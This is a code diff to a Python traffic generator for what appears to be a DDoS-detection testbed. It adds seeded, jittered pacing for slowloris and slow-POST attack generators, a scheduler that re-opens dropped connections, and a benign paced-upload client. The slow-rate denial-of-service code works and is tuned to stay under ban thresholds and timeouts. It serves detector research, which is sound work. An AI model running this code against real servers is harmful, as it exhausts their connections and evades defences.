@@ -22,6 +22,11 @@ test_distributed_suite.py, parameterised to stay below the daemon's ban threshol
 netem profile as address aliases, so a generator must send from its entity's own address. Without
 it the generator behaves exactly as before (the kernel picks the namespace's only address).
 
+P4 (docs/P4_SLOW_DESIGN.md §5; ml/p4_traffic.py FAMILIES): slowloris with `header_every_s` given as a range [lo, hi], and
+slowpost with `byte_every_s` given as a range, run the frozen P4 pacing from a seeded schedule (ml/p4_traffic.py
+loris_schedule, post_schedule): every connection has its own gaps, a closed connection is re-opened at once and carries
+on with its slot's schedule, and --plan prints the schedule. With a number there, they run exactly as before.
+
 --records PATH (L7 v2, docs/L7V2_DESIGN.md §5.1; benign plan kinds): one CSV row per request as it
 completes (eval/l7v2_harm.RECORD_COLUMNS): t_intended = t_sent (a closed-loop client has no schedule
 within a view), t_done, status, err, the route class (l7_webapp's site map), the plan's user, view and
@@ -43,6 +48,7 @@ import time
 
 import l7_benign  # ml/ is the script's directory, so it is on sys.path
 import l7_bots
+import p4_traffic
 
 TESTBED_NET = ipaddress.ip_network("10.0.0.0/16")
 UAS = [
@@ -219,19 +225,59 @@ def benign_downloader(host, port, params, dur, rng):
         time.sleep(rng.uniform(lo, hi))
 
 
+class PacedBody:
+    """An upload body of `n` bytes that leaves no faster than `rate` bytes/s: P4's slow_uploader, a client behind a
+    16 kbit/s link (ml/l7_benign.py upload kinds). A file-like object with a length, so `requests` sends it with a
+    Content-Length like any body of known size, and reads it a piece at a time; each read returns at most CHUNK bytes,
+    once the rate allows them."""
+    CHUNK = 512
+
+    def __init__(self, n, rate, clock=time.monotonic, sleep=time.sleep):
+        if not rate > 0:
+            raise ValueError(f"rate {rate!r}: a positive number of bytes per second")
+        self.n, self.rate, self.clock, self.sleep = int(n), float(rate), clock, sleep
+        self.sent, self.t0 = 0, None
+
+    def __len__(self):
+        return self.n
+
+    def read(self, size=-1):
+        left = self.n - self.sent
+        if left <= 0:
+            return b""
+        if self.t0 is None:
+            self.t0 = self.clock()
+        want = min(left, self.CHUNK if size is None or size < 0 else max(1, min(size, self.CHUNK)))
+        wait = self.t0 + (self.sent + want) / self.rate - self.clock()
+        if wait > 0:
+            self.sleep(wait)
+        self.sent += want
+        return b"x" * want
+
+
 def benign_uploader(host, port, params, dur, rng):
+    """Post a body to /upload, think, repeat (ml/l7_benign.upload_plan; the P5 uploader's draws). With `rate_Bps` (P4's
+    slow_uploader) the body is paced at that rate (PacedBody); everything else is the same."""
     import requests
-    lo, hi = params.get("think_s", [4.0, 10.0])
-    blo, bhi = params.get("body_bytes", [200, 60000])
     path = params.get("path", "/upload")
+    rate = params.get("rate_Bps")
     end = _deadline(dur)
-    while time.time() < end:
-        body = b"x" * rng.randint(blo, bhi)
+    for size, think in l7_benign.upload_plan(params, dur, rng):
+        if time.time() >= end:
+            break
+        body = PacedBody(size, rate) if rate else b"x" * size
         try:
             _one_shot("post", _base(host, port) + path, data=body, verify=False, timeout=15)
         except requests.RequestException:
             pass
-        time.sleep(rng.uniform(lo, hi))
+        time.sleep(think)
+
+
+def benign_slow_uploader(host, port, params, dur, rng):
+    """P4's slow_uploader: the uploader with its body paced at params["rate_Bps"] (docs/P4_SLOW_DESIGN.md §4.2)."""
+    if not params.get("rate_Bps"):
+        raise SystemExit("[-] slow_uploader needs params rate_Bps (bytes per second)")
+    benign_uploader(host, port, params, dur, rng)
 
 
 def benign_nat_gateway(host, port, params, dur, rng):
@@ -461,9 +507,105 @@ def _open_sockets(host, port, n, send_head):
     return socks
 
 
+def paced(family, params):
+    """True for the P4 pacing of a slow family (a range of gaps, ml/p4_traffic.py), False for the earlier one."""
+    key = {"slowloris": "header_every_s", "slowpost": "byte_every_s"}.get(family)
+    return key is not None and isinstance(params.get(key), (list, tuple))
+
+
+def slow_schedule(family, host, params, dur, rng):
+    """The P4 schedule of one slow source, drawn from its seed as its generator draws it: the request head (Slowloris:
+    one head for every connection, its query and UA drawn as before), then each connection slot's events
+    (ml/p4_traffic.py loris_schedule / post_schedule). What --plan prints and what attack_slowloris / attack_slowpost
+    execute."""
+    if family == "slowloris":
+        head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
+                f"User-Agent: {rng.choice(UAS)}\r\n")
+        return {"family": family, "head": head, "slots": p4_traffic.loris_schedule(params, dur, rng)}
+    path = params.get("path", "/upload")
+    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
+            "Content-Type: application/octet-stream\r\nContent-Length: {n}\r\n\r\n")
+    return {"family": family, "head": head, "slots": p4_traffic.post_schedule(params, dur, rng)}
+
+
+def run_slow_schedule(host, port, sched, dur):
+    """Execute a P4 slow schedule: open every slot's connection with its head, then send each slot's events at their
+    times from the start, one thread for all. A slot whose send fails (its connection was closed) is re-opened at once,
+    as attack_slowpost re-opens, and one that could not be opened is tried again at its next event. A slow-POST
+    connection declares its slot's next Content-Length and is closed and re-opened once its body is complete. Returns
+    {"opened", "reopened", "sent_bytes", "failed_opens"}."""
+    import heapq
+    post = sched["family"] == "slowpost"
+    slots = sched["slots"]
+    events = [s["chunks"] if post else s["lines"] for s in slots]
+    stats = {"opened": 0, "reopened": 0, "sent_bytes": 0, "failed_opens": 0}
+    conns, opens, body = [None] * len(slots), [0] * len(slots), [0] * len(slots)
+
+    def head(i):
+        if not post:
+            return sched["head"].encode()
+        lengths = slots[i]["content_lengths"]
+        return sched["head"].format(n=lengths[opens[i] % len(lengths)]).encode()
+
+    def open_slot(i):
+        got = _open_sockets(host, port, 1, head(i))
+        if not got:
+            stats["failed_opens"] += 1
+            return None
+        stats["opened" if opens[i] == 0 else "reopened"] += 1
+        opens[i] += 1
+        body[i] = 0
+        return got[0]
+
+    def close(i):
+        if conns[i] is not None:
+            conns[i].close()
+        conns[i] = None
+
+    start = time.time()
+    end = start + dur
+    for i in range(len(slots)):
+        conns[i] = open_slot(i)
+    heap = [(ev[0][0], i, 0) for i, ev in enumerate(events) if ev]
+    heapq.heapify(heap)
+    while heap:
+        t, i, k = heapq.heappop(heap)
+        if start + t >= end:
+            break
+        time.sleep(max(0.0, start + t - time.time()))
+        if conns[i] is None:
+            conns[i] = open_slot(i)
+        if conns[i] is not None:
+            payload = events[i][k][1]
+            if post:
+                limit = slots[i]["content_lengths"][(opens[i] - 1) % len(slots[i]["content_lengths"])]
+                payload = b"x" * min(payload, limit - body[i])
+            else:
+                payload = payload.encode()
+            try:
+                conns[i].sendall(payload)
+                stats["sent_bytes"] += len(payload)
+                body[i] += len(payload)
+                if post and body[i] >= limit:          # the body is complete: re-open a fresh slow POST
+                    close(i)
+                    conns[i] = open_slot(i)
+            except OSError:
+                close(i)
+                conns[i] = open_slot(i)
+        if k + 1 < len(events[i]):
+            heapq.heappush(heap, (events[i][k + 1][0], i, k + 1))
+    for i in range(len(slots)):
+        close(i)
+    return stats
+
+
 def attack_slowloris(host, port, params, dur, rng):
     """`conns` (< ban threshold) connections, each dribbling one header line every
-    header_every_s (< the 5 s header timeout), never completing the request."""
+    header_every_s (< the 5 s header timeout), never completing the request. With P4's
+    pacing (a range of gaps) the seeded schedule of slow_schedule() runs instead."""
+    if paced("slowloris", params):
+        run_slow_schedule(host, 80, slow_schedule("slowloris", host, params, dur, rng), dur)
+        return
     conns = params["conns"]
     every = params["header_every_s"]
     head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
@@ -483,7 +625,11 @@ def attack_slowloris(host, port, params, dur, rng):
 
 def attack_slowpost(host, port, params, dur, rng):
     """`conns` slow-body POSTs: Content-Length <= 64 KiB (no 413), one body byte
-    every byte_every_s (< the 5 s body timeout, so no RUDY ban), looping."""
+    every byte_every_s (< the 5 s body timeout, so no RUDY ban), looping. With P4's
+    pacing (a range of gaps) the seeded schedule of slow_schedule() runs instead."""
+    if paced("slowpost", params):
+        run_slow_schedule(host, 80, slow_schedule("slowpost", host, params, dur, rng), dur)
+        return
     conns = params["conns"]
     every = params["byte_every_s"]
     n = min(params.get("body_bytes", 60000), 65536)
@@ -551,7 +697,8 @@ BENIGN = {"curl_oneshot": benign_curl_oneshot, "http2": benign_http2,
           "crawler_polite": benign_crawler_polite, "tpcw_browsing": benign_tpcw_browsing,
           "tpcw_shopping": benign_tpcw_shopping, "zipf_browser": benign_zipf_browser,
           "search_user": benign_search_user,
-          "exporter": benign_exporter, "flash_crowd": benign_flash_crowd}
+          "exporter": benign_exporter, "flash_crowd": benign_flash_crowd,
+          "slow_uploader": benign_slow_uploader}
 ATTACK = {"subthreshold_flood": attack_subthreshold_flood, "scraper": attack_scraper,
           "padded_flood": attack_padded_flood, "credstuff": attack_credstuff,
           "slowloris": attack_slowloris, "slowpost": attack_slowpost,
@@ -593,6 +740,8 @@ def main(argv=None):
             raise SystemExit(f"[-] --records is for the benign plan kinds, not {args.role} {name}")
         plan["records"] = args.records
     if args.plan:
+        if args.role == "attack" and paced(name, params):
+            plan["schedule"] = slow_schedule(name, args.host, params, args.duration, random.Random(args.seed))
         print(json.dumps(plan))
         return 0
     for what, addr in (("target", args.host), ("source", args.source)):
